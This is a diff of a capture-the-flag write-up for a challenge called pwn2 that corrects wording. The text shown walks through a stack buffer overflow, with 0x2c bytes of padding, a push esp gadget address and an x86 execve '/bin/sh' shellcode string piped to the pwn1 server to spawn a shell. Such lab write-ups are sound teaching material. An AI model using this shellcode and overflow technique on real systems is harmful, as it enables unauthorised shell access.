@@ -16,17 +16,17 @@ It runs on the same box as pwn1.
 The binary for pwn2 contains no imports for system and as such we can't spawn a shell with that. This means we have to turn to pwn1 to get the addresses of system and "/bin/sh" in libc. 
 
 ### Details ###
-The buffer is yet again at an offset of 0x2c from the location that will be retn'd. This means we begin with the same concept. 
+The buffer is yet again at an offset of 0x2c from the location that will be returned. This means we begin with the same concept. 
 
 ```python
 shell_code = 'A'*0x2c
 ```
 
-Then we find how to eip to be esp.
-First find a push esp, the opcode for this inst is 0xff 0xf4.
+Then we find how to change eip to be esp.
+First find a push esp, the opcode for this instuction is 0xff 0xf4.
 We can use the 0xff 0xf4 from _start that is part of the call to __libc_start_main. 
 
-The next instructions are all xchg ax, ax. This is effectively a nop and is used by gcc for spacing. Then theres a function that retns without changing the stack. Perfect, our code will fall through from there.
+The next instructions are all xchg ax, ax. This is effectively a nop and is used by gcc for spacing. Then theres a function that returns without changing the stack. Perfect, our code will fall through from there.
 
 ```python
 shell_code += '\xd0x83\x04\x08'
@@ -41,9 +41,9 @@ shell_code += "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x89\
 print shell_code
 ```
 
-Now we just pipe that in to the pwn1 server to get a call of any system inst that can be "/bin/sh" to spawn us a shell.
+Now we just pipe that in to the pwn1 server to get a call of any system instruction that can be "/bin/sh" to spawn us a shell.
 
-After this go to the tmp directory so you can use gdb (it only works with file write perms), wget pwn2. Then you can execute gdb on pwn2 and do:
+After this go to the tmp directory so you can use gdb (it only works with file write perms), and wget pwn2. Then you can execute gdb on pwn2 and do:
 
 ```
 b main
